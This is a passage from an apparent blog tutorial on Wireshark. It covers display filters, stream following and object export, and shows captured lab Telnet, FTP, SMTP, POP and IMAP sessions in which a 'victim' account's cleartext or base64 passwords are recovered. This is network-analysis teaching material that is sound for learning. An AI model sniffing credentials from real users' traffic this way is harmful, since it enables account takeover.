&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;essentials-display-filters&quot;&gt;Essentials: Display Filters&lt;&#x2F;h2&gt;
&lt;p&gt;Be aware, this feature is commonly confused with Capture Filter and it&#x27;s entirely a different feature set. Display Filters are used for general filtering &lt;em&gt;after&lt;&#x2F;em&gt; capturing the network data traffic. &lt;&#x2F;p&gt;
&lt;p&gt;Common examples of what you can do with capture filters:&lt;&#x2F;p&gt;
&lt;p&gt;Show only SMTP (port 25) and ICMP traffic:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;tcp.port eq 25 or icmp
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Show only traffic in the LAN (192.168.x.x), between workstations and servers -- no Internet:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;ip.src==192.168.0.0&#x2F;16 and ip.dst==192.168.0.0&#x2F;16
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;TCP buffer full -- Source is instructing Destination to stop sending data&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;tcp.window_size == 0 &amp;amp;&amp;amp; tcp.flags.reset != 1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Filter on Windows -- Filter out noise, while watching Windows Client - DC exchanges&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;smb || nbns || dcerpc || nbss || dns
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To better understand the basics of how you can filter any type of field items you would like, by selecting any items in the Packet Details section, it will show you the filter ID on the bottom of the window. In the filtering text box, if you sort using the filtering ID as desired, you can use comparison operators to find specific values or ranges.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;wireshark-filtering.png&quot; alt=&quot;Wireshark Filtering&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;essentials-follow-the-protocol-stream&quot;&gt;Essentials: Follow the Protocol Stream:&lt;&#x2F;h2&gt;
&lt;p&gt;It can be very helpful to see a protocol in the way that the application layer sees it. Perhaps you are looking for passwords in a Telnet stream, or you are trying to make sense of a data stream. Maybe you just need a display filter to show only the packets in a TLS or SSL stream. By following a particular stream, you are able to trace and isolate network traffic for the specific protocol.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;wireshark-streams.png&quot; alt=&quot;Wireshark Stream&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;essentials-export-objects&quot;&gt;Essentials: Export Objects&lt;&#x2F;h2&gt;
&lt;p&gt;Network traffic can be reconstructed back into readable files without the need for external tools. At times, there are plenty of readable files to sift through and it can be difficult to trace back which protocol stream it belongs to. In order to trace the exported file and the packet stream, take note of the packet number column in the export window. Back to the main window, there is a button to specify which packet you want to view in the packet list.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;wireshark-export.png&quot; alt=&quot;Wireshark Export&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;wireshark-goto.png&quot; alt=&quot;Wireshark Goto&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;telnet&quot;&gt;Telnet&lt;&#x2F;h2&gt;
&lt;p&gt;Follow the TCP stream:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;........... ..!..&amp;quot;..&amp;#39;.....%..&amp;amp;..... ..#..&amp;#39;..$........!..&amp;quot;..&amp;quot;.........%..&amp;amp;..#..$..&amp;quot;...................	..
&lt;&#x2F;span&gt;&lt;span&gt;........................&amp;quot;...... .....&amp;#39;........... .0,0....&amp;#39;.......UNKNOWN............UNKNOWN................!.....&amp;quot;........&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;Linux 4.9.87-linuxkit-aufs (3413e600e1ec) (pts&#x2F;0)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;..3413e600e1ec login: victim
&lt;&#x2F;span&gt;&lt;span&gt;.victim
&lt;&#x2F;span&gt;&lt;span&gt;..Password: PASSWORD123
&lt;&#x2F;span&gt;&lt;span&gt;.
&lt;&#x2F;span&gt;&lt;span&gt;uname -a
&lt;&#x2F;span&gt;&lt;span&gt;.uname -a
&lt;&#x2F;span&gt;&lt;span&gt;.Linux 3413e600e1ec 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64
&lt;&#x2F;span&gt;&lt;span&gt;.
&lt;&#x2F;span&gt;&lt;span&gt;The programs included with the Debian GNU&#x2F;Linux system are free software;
&lt;&#x2F;span&gt;&lt;span&gt;the exact distribution terms for each program are described in the
&lt;&#x2F;span&gt;&lt;span&gt;individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent
&lt;&#x2F;span&gt;&lt;span&gt;permitted by applicable law.
&lt;&#x2F;span&gt;&lt;span&gt;.victim@3413e600e1ec:~$ una.me -a
&lt;&#x2F;span&gt;&lt;span&gt;.Linux 3413e600e1ec 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 GNU&#x2F;Linux
&lt;&#x2F;span&gt;&lt;span&gt;.victim@3413e600e1ec:~$
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;ftp&quot;&gt;FTP&lt;&#x2F;h2&gt;
&lt;p&gt;Follow the TCP stream:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;220 0a316eeeb0c3 FTP server (GNU inetutils UNKNOWN) ready.
&lt;&#x2F;span&gt;&lt;span&gt;USER victim
&lt;&#x2F;span&gt;&lt;span&gt;331 Password required for victim.
&lt;&#x2F;span&gt;&lt;span&gt;PASS PASSWORD123
&lt;&#x2F;span&gt;&lt;span&gt;230- 
&lt;&#x2F;span&gt;&lt;span&gt;230- The programs included with the Debian GNU&#x2F;Linux system are free software;
&lt;&#x2F;span&gt;&lt;span&gt;230- the exact distribution terms for each program are described in the
&lt;&#x2F;span&gt;&lt;span&gt;230- individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.
&lt;&#x2F;span&gt;&lt;span&gt;230- 
&lt;&#x2F;span&gt;&lt;span&gt;230- Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent
&lt;&#x2F;span&gt;&lt;span&gt;230- permitted by applicable law.
&lt;&#x2F;span&gt;&lt;span&gt;230 User victim logged in.
&lt;&#x2F;span&gt;&lt;span&gt;PWD
&lt;&#x2F;span&gt;&lt;span&gt;257 &amp;quot;&#x2F;home&#x2F;victim&amp;quot; is current directory.
&lt;&#x2F;span&gt;&lt;span&gt;FEAT
&lt;&#x2F;span&gt;&lt;span&gt;211- Supported extensions:
&lt;&#x2F;span&gt;&lt;span&gt; MDTM
&lt;&#x2F;span&gt;&lt;span&gt; SIZE
&lt;&#x2F;span&gt;&lt;span&gt; REST STREAM
&lt;&#x2F;span&gt;&lt;span&gt; EPRT
&lt;&#x2F;span&gt;&lt;span&gt; EPSV
&lt;&#x2F;span&gt;&lt;span&gt; LPRT
&lt;&#x2F;span&gt;&lt;span&gt; LPSV
&lt;&#x2F;span&gt;&lt;span&gt;211 End
&lt;&#x2F;span&gt;&lt;span&gt;HELP SITE
&lt;&#x2F;span&gt;&lt;span&gt;214- The following SITE commands are recognized (* =&amp;gt;&amp;#39;s unimplemented).
&lt;&#x2F;span&gt;&lt;span&gt;   CHMOD   HELP    IDLE    UMASK 
&lt;&#x2F;span&gt;&lt;span&gt;214 Direct comments to ftp-bugs@0a316eeeb0c3.
&lt;&#x2F;span&gt;&lt;span&gt;CLNT NcFTP 3.2.5 linux-x86_64-glibc2.13
&lt;&#x2F;span&gt;&lt;span&gt;500 &amp;#39;CLNT NcFTP 3.2.5 linux-x86_64-glibc2.13&amp;#39;: command not recognized
&lt;&#x2F;span&gt;&lt;span&gt;PWD
&lt;&#x2F;span&gt;&lt;span&gt;257 &amp;quot;&#x2F;home&#x2F;victim&amp;quot; is current directory.
&lt;&#x2F;span&gt;&lt;span&gt;QUIT
&lt;&#x2F;span&gt;&lt;span&gt;221 Goodbye.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;ftp-pasv&quot;&gt;FTP: PASV&lt;&#x2F;h3&gt;
&lt;p&gt;Follow TCP stream:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;220 d18e9e5064da FTP server (GNU inetutils UNKNOWN) ready.
&lt;&#x2F;span&gt;&lt;span&gt;USER victim
&lt;&#x2F;span&gt;&lt;span&gt;331 Password required for victim.
&lt;&#x2F;span&gt;&lt;span&gt;PASS password
&lt;&#x2F;span&gt;&lt;span&gt;230- 
&lt;&#x2F;span&gt;&lt;span&gt;230- The programs included with the Debian GNU&#x2F;Linux system are free software;
&lt;&#x2F;span&gt;&lt;span&gt;230- the exact distribution terms for each program are described in the
&lt;&#x2F;span&gt;&lt;span&gt;230- individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.
&lt;&#x2F;span&gt;&lt;span&gt;230- 
&lt;&#x2F;span&gt;&lt;span&gt;230- Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent
&lt;&#x2F;span&gt;&lt;span&gt;230- permitted by applicable law.
&lt;&#x2F;span&gt;&lt;span&gt;230 User victim logged in.
&lt;&#x2F;span&gt;&lt;span&gt;PWD
&lt;&#x2F;span&gt;&lt;span&gt;257 &amp;quot;&#x2F;home&#x2F;victim&amp;quot; is current directory.
&lt;&#x2F;span&gt;&lt;span&gt;FEAT
&lt;&#x2F;span&gt;&lt;span&gt;211- Supported extensions:
&lt;&#x2F;span&gt;&lt;span&gt; MDTM
&lt;&#x2F;span&gt;&lt;span&gt; SIZE
&lt;&#x2F;span&gt;&lt;span&gt; REST STREAM
&lt;&#x2F;span&gt;&lt;span&gt; EPRT
&lt;&#x2F;span&gt;&lt;span&gt; EPSV
&lt;&#x2F;span&gt;&lt;span&gt; LPRT
&lt;&#x2F;span&gt;&lt;span&gt; LPSV
&lt;&#x2F;span&gt;&lt;span&gt;211 End
&lt;&#x2F;span&gt;&lt;span&gt;HELP SITE
&lt;&#x2F;span&gt;&lt;span&gt;214- The following SITE commands are recognized (* =&amp;gt;&amp;#39;s unimplemented).
&lt;&#x2F;span&gt;&lt;span&gt;   CHMOD   HELP    IDLE    UMASK 
&lt;&#x2F;span&gt;&lt;span&gt;214 Direct comments to ftp-bugs@d18e9e5064da.
&lt;&#x2F;span&gt;&lt;span&gt;CLNT NcFTPGet 3.2.5 linux-x86_64-glibc2.13
&lt;&#x2F;span&gt;&lt;span&gt;500 &amp;#39;CLNT NcFTPGet 3.2.5 linux-x86_64-glibc2.13&amp;#39;: command not recognized
&lt;&#x2F;span&gt;&lt;span&gt;TYPE I
&lt;&#x2F;span&gt;&lt;span&gt;200 Type set to I.
&lt;&#x2F;span&gt;&lt;span&gt;MLST key.txt
&lt;&#x2F;span&gt;&lt;span&gt;500 &amp;#39;MLST key.txt&amp;#39;: command not recognized
&lt;&#x2F;span&gt;&lt;span&gt;SIZE key.txt
&lt;&#x2F;span&gt;&lt;span&gt;213 49
&lt;&#x2F;span&gt;&lt;span&gt;MDTM key.txt
&lt;&#x2F;span&gt;&lt;span&gt;213 20180725090145
&lt;&#x2F;span&gt;&lt;span&gt;PASV
&lt;&#x2F;span&gt;&lt;span&gt;227 Entering Passive Mode (172,21,0,2,134,155)
&lt;&#x2F;span&gt;&lt;span&gt;RETR key.txt
&lt;&#x2F;span&gt;&lt;span&gt;150 Opening BINARY mode data connection for &amp;#39;key.txt&amp;#39; (49 bytes).
&lt;&#x2F;span&gt;&lt;span&gt;226 Transfer complete.
&lt;&#x2F;span&gt;&lt;span&gt;QUIT
&lt;&#x2F;span&gt;&lt;span&gt;221 Goodbye.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Fundamental knowledge when analyzing protocols, if you see a data connection to obtain or read files, chances are there is a second stream of which you can view what is being downloaded or read. You can view the second TCP stream inside the same window of which when you use the Follow TCP stream function.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;ftp.png&quot; alt=&quot;ftp&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;rsh-reading-client-and-server-interactions&quot;&gt;RSH: Reading Client and Server Interactions&lt;&#x2F;h2&gt;
&lt;p&gt;Follow the TCP stream:
&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;rsh.png&quot; alt=&quot;RSH&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;rlogin-viewing-credentials-in-cleartext&quot;&gt;rLogin: Viewing Credentials in Cleartext&lt;&#x2F;h2&gt;
&lt;p&gt;Follow the TCP stream:
&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;rlogin.png&quot; alt=&quot;rLogin&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;smtp&quot;&gt;SMTP&lt;&#x2F;h2&gt;
&lt;p&gt;Follow the TCP stream:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;220 pcap_08.libcurl.so ESMTP Postfix (Debian&#x2F;GNU)
&lt;&#x2F;span&gt;&lt;span&gt;EHLO client
&lt;&#x2F;span&gt;&lt;span&gt;250-pcap_08.libcurl.so
&lt;&#x2F;span&gt;&lt;span&gt;250-PIPELINING
&lt;&#x2F;span&gt;&lt;span&gt;250-SIZE 10240000
&lt;&#x2F;span&gt;&lt;span&gt;250-VRFY
&lt;&#x2F;span&gt;&lt;span&gt;250-ETRN
&lt;&#x2F;span&gt;&lt;span&gt;250-AUTH PLAIN LOGIN
&lt;&#x2F;span&gt;&lt;span&gt;250-AUTH=PLAIN LOGIN
&lt;&#x2F;span&gt;&lt;span&gt;250-ENHANCEDSTATUSCODES
&lt;&#x2F;span&gt;&lt;span&gt;250-8BITMIME
&lt;&#x2F;span&gt;&lt;span&gt;250 DSN
&lt;&#x2F;span&gt;&lt;span&gt;AUTH LOGIN
&lt;&#x2F;span&gt;&lt;span&gt;334 VXNlcm5hbWU6
&lt;&#x2F;span&gt;&lt;span&gt;dmljdGlt
&lt;&#x2F;span&gt;&lt;span&gt;334 UGFzc3dvcmQ6
&lt;&#x2F;span&gt;&lt;span&gt;MTVhNjkwYjItYWE0Ni00NzlmLWJjNWUtMzQ0ODE1OGYwNmNl
&lt;&#x2F;span&gt;&lt;span&gt;235 2.7.0 Authentication successful
&lt;&#x2F;span&gt;&lt;span&gt;MAIL FROM:&amp;lt;root@client&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;250 2.1.0 Ok
&lt;&#x2F;span&gt;&lt;span&gt;RCPT TO:&amp;lt;root@server&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;250 2.1.5 Ok
&lt;&#x2F;span&gt;&lt;span&gt;DATA
&lt;&#x2F;span&gt;&lt;span&gt;354 End data with &amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;Received: by client (sSMTP sendmail emulation); Tue, 31 Jul 2018 06:30:43 +0000
&lt;&#x2F;span&gt;&lt;span&gt;From: &amp;quot;root&amp;quot; &amp;lt;root@client&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;Date: Tue, 31 Jul 2018 06:30:43 +0000
&lt;&#x2F;span&gt;&lt;span&gt;To: test@testlab.com
&lt;&#x2F;span&gt;&lt;span&gt;Subject: test email
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;hello world!
&lt;&#x2F;span&gt;&lt;span&gt;.
&lt;&#x2F;span&gt;&lt;span&gt;250 2.0.0 Ok: queued as AE4254277D
&lt;&#x2F;span&gt;&lt;span&gt;QUIT
&lt;&#x2F;span&gt;&lt;span&gt;221 2.0.0 Bye
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Decode the base64 values to reveal the string:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;echo &amp;#39;VXNlcm5hbWU6&amp;#39; | base64 -D
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;smtp-email-zip-attachments&quot;&gt;SMTP: Email Zip Attachments&lt;&#x2F;h3&gt;
&lt;p&gt;Follow the TCP stream:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;220 pcap_08.libcurl.so ESMTP Postfix (Debian&#x2F;GNU)
&lt;&#x2F;span&gt;&lt;span&gt;EHLO client
&lt;&#x2F;span&gt;&lt;span&gt;250-pcap_08.libcurl.so
&lt;&#x2F;span&gt;&lt;span&gt;250-PIPELINING
&lt;&#x2F;span&gt;&lt;span&gt;250-SIZE 10240000
&lt;&#x2F;span&gt;&lt;span&gt;250-VRFY
&lt;&#x2F;span&gt;&lt;span&gt;250-ETRN
&lt;&#x2F;span&gt;&lt;span&gt;250-AUTH PLAIN LOGIN
&lt;&#x2F;span&gt;&lt;span&gt;250-AUTH=PLAIN LOGIN
&lt;&#x2F;span&gt;&lt;span&gt;250-ENHANCEDSTATUSCODES
&lt;&#x2F;span&gt;&lt;span&gt;250-8BITMIME
&lt;&#x2F;span&gt;&lt;span&gt;250 DSN
&lt;&#x2F;span&gt;&lt;span&gt;AUTH LOGIN
&lt;&#x2F;span&gt;&lt;span&gt;334 VXNlcm5hbWU6
&lt;&#x2F;span&gt;&lt;span&gt;dmljdGlt
&lt;&#x2F;span&gt;&lt;span&gt;334 UGFzc3dvcmQ6
&lt;&#x2F;span&gt;&lt;span&gt;dmljdGlt
&lt;&#x2F;span&gt;&lt;span&gt;235 2.7.0 Authentication successful
&lt;&#x2F;span&gt;&lt;span&gt;MAIL FROM:&amp;lt;root@client&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;250 2.1.0 Ok
&lt;&#x2F;span&gt;&lt;span&gt;RCPT TO:&amp;lt;root@server&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;250 2.1.5 Ok
&lt;&#x2F;span&gt;&lt;span&gt;DATA
&lt;&#x2F;span&gt;&lt;span&gt;354 End data with &amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;Received: by client (sSMTP sendmail emulation); Wed, 03 Oct 2018 23:19:57 +0000
&lt;&#x2F;span&gt;&lt;span&gt;From: &amp;quot;root&amp;quot; &amp;lt;root@client&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;Date: Wed, 03 Oct 2018 23:19:57 +0000
&lt;&#x2F;span&gt;&lt;span&gt;To: test@test.com
&lt;&#x2F;span&gt;&lt;span&gt;Subject: test email
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;hello world!
&lt;&#x2F;span&gt;&lt;span&gt;begin 644 attachment.zip
&lt;&#x2F;span&gt;&lt;span&gt;M4$L#!`H``````&amp;#39;VZ0TTBWE0B,````#`````2`!P`=&amp;amp;UP+V%T=&amp;amp;%C:&amp;amp;UE;G0N
&lt;&#x2F;span&gt;&lt;span&gt;M=&amp;#39;AT550)``.=3K5;G4ZU6W5X&amp;quot;P`!!``````$`````%1H92!K97D@:7,@.#1E
&lt;&#x2F;span&gt;&lt;span&gt;M,6-F-6,M-V1F.2TT96,Q+3AC8F$M8S8Y,C@W9C(V-#9F&amp;quot;E!+`0(&amp;gt;`PH`````
&lt;&#x2F;span&gt;&lt;span&gt;M`&amp;#39;VZ0TTBWE0B,````#`````2`!@```````$```&amp;quot;D@0````!T;7`O871T86-H
&lt;&#x2F;span&gt;&lt;span&gt;M;65N=&amp;quot;YT&amp;gt;&amp;#39;155`4``YU.M5MU&amp;gt;`L``00`````!`````!02P4&amp;amp;``````$``0!8
&lt;&#x2F;span&gt;&lt;span&gt;)````?```````
&lt;&#x2F;span&gt;&lt;span&gt;`
&lt;&#x2F;span&gt;&lt;span&gt;end
&lt;&#x2F;span&gt;&lt;span&gt;.
&lt;&#x2F;span&gt;&lt;span&gt;250 2.0.0 Ok: queued as 07FBE34602F
&lt;&#x2F;span&gt;&lt;span&gt;QUIT
&lt;&#x2F;span&gt;&lt;span&gt;221 2.0.0 Bye
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Save the attachment info a file:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;vi attachment.zip 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;begin 644 attachment.zip
&lt;&#x2F;span&gt;&lt;span&gt;M4$L#!`H``````&amp;#39;VZ0TTBWE0B,````#`````2`!P`=&amp;amp;UP+V%T=&amp;amp;%C:&amp;amp;UE;G0N
&lt;&#x2F;span&gt;&lt;span&gt;M=&amp;#39;AT550)``.=3K5;G4ZU6W5X&amp;quot;P`!!``````$`````%1H92!K97D@:7,@.#1E
&lt;&#x2F;span&gt;&lt;span&gt;M,6-F-6,M-V1F.2TT96,Q+3AC8F$M8S8Y,C@W9C(V-#9F&amp;quot;E!+`0(&amp;gt;`PH`````
&lt;&#x2F;span&gt;&lt;span&gt;M`&amp;#39;VZ0TTBWE0B,````#`````2`!@```````$```&amp;quot;D@0````!T;7`O871T86-H
&lt;&#x2F;span&gt;&lt;span&gt;M;65N=&amp;quot;YT&amp;gt;&amp;#39;155`4``YU.M5MU&amp;gt;`L``00`````!`````!02P4&amp;amp;``````$``0!8
&lt;&#x2F;span&gt;&lt;span&gt;)````?```````
&lt;&#x2F;span&gt;&lt;span&gt;`
&lt;&#x2F;span&gt;&lt;span&gt;end
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Decode the data filed using &lt;code&gt;uudecode&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;uudecode attachment.zip
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The data file is ready to unzip:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;unzip attachment.zip
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;FYI, the other easier method rather than doing it manual is using Wireshark&#x27;s Export feature:
&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;tutorial-wireshark&#x2F;smtp-export.png&quot; alt=&quot;smtp-export&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;pop&quot;&gt;POP&lt;&#x2F;h2&gt;
&lt;p&gt;Follow the TCP stream:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;+OK Dovecot ready.
&lt;&#x2F;span&gt;&lt;span&gt;CAPA
&lt;&#x2F;span&gt;&lt;span&gt;+OK
&lt;&#x2F;span&gt;&lt;span&gt;CAPA
&lt;&#x2F;span&gt;&lt;span&gt;TOP
&lt;&#x2F;span&gt;&lt;span&gt;UIDL
&lt;&#x2F;span&gt;&lt;span&gt;RESP-CODES
&lt;&#x2F;span&gt;&lt;span&gt;PIPELINING
&lt;&#x2F;span&gt;&lt;span&gt;AUTH-RESP-CODE
&lt;&#x2F;span&gt;&lt;span&gt;USER
&lt;&#x2F;span&gt;&lt;span&gt;SASL PLAIN
&lt;&#x2F;span&gt;&lt;span&gt;.
&lt;&#x2F;span&gt;&lt;span&gt;USER victim
&lt;&#x2F;span&gt;&lt;span&gt;+OK
&lt;&#x2F;span&gt;&lt;span&gt;PASS mypassword123
&lt;&#x2F;span&gt;&lt;span&gt;+OK Logged in.
&lt;&#x2F;span&gt;&lt;span&gt;STAT
&lt;&#x2F;span&gt;&lt;span&gt;+OK 0 0
&lt;&#x2F;span&gt;&lt;span&gt;QUIT
&lt;&#x2F;span&gt;&lt;span&gt;+OK Logging out.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;imap&quot;&gt;IMAP&lt;&#x2F;h2&gt;
&lt;p&gt;Follow the TCP stream:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN] Dovecot ready.
&lt;&#x2F;span&gt;&lt;span&gt;A0001 CAPABILITY
&lt;&#x2F;span&gt;&lt;span&gt;* CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN
&lt;&#x2F;span&gt;&lt;span&gt;A0001 OK Pre-login capabilities listed, post-login capabilities have more.
&lt;&#x2F;span&gt;&lt;span&gt;A0002 LOGIN &amp;quot;victim&amp;quot; &amp;quot;mypassword123&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;* CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS SPECIAL-USE BINARY MOVE
&lt;&#x2F;span&gt;&lt;span&gt;A0002 OK Logged in
&lt;&#x2F;span&gt;&lt;span&gt;A0003 SELECT &amp;quot;INBOX&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
&lt;&#x2F;span&gt;&lt;span&gt;* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
&lt;&#x2F;span&gt;&lt;span&gt;* 0 EXISTS
&lt;&#x2F;span&gt;&lt;span&gt;* 0 RECENT
&lt;&#x2F;span&gt;&lt;span&gt;* OK [UIDVALIDITY 1538980287] UIDs valid
&lt;&#x2F;span&gt;&lt;span&gt;* OK [UIDNEXT 1] Predicted next UID
&lt;&#x2F;span&gt;&lt;span&gt;A0003 OK [READ-WRITE] Select completed (0.000 secs).
&lt;&#x2F;span&gt;&lt;span&gt;A0004 LOGOUT
&lt;&#x2F;span&gt;&lt;span&gt;* BYE Logging out
&lt;&#x2F;span&gt;&lt;span&gt;A0004 OK Logout completed.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;http&quot;&gt;HTTP&lt;&#x2F;h2&gt;
&lt;p&gt;What is important about analyzing HTTP protocol is looking at the overall content of the data stream. Look for clues like type of HTTP request, sensitive authorization headers, cookies, parameters, tokens, response body.&lt;&#x2F;p&gt;
&lt;p&gt;Follow the TCP stream:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;GET &#x2F;?key=SENSITIVE_TOKEN HTTP&#x2F;1.1
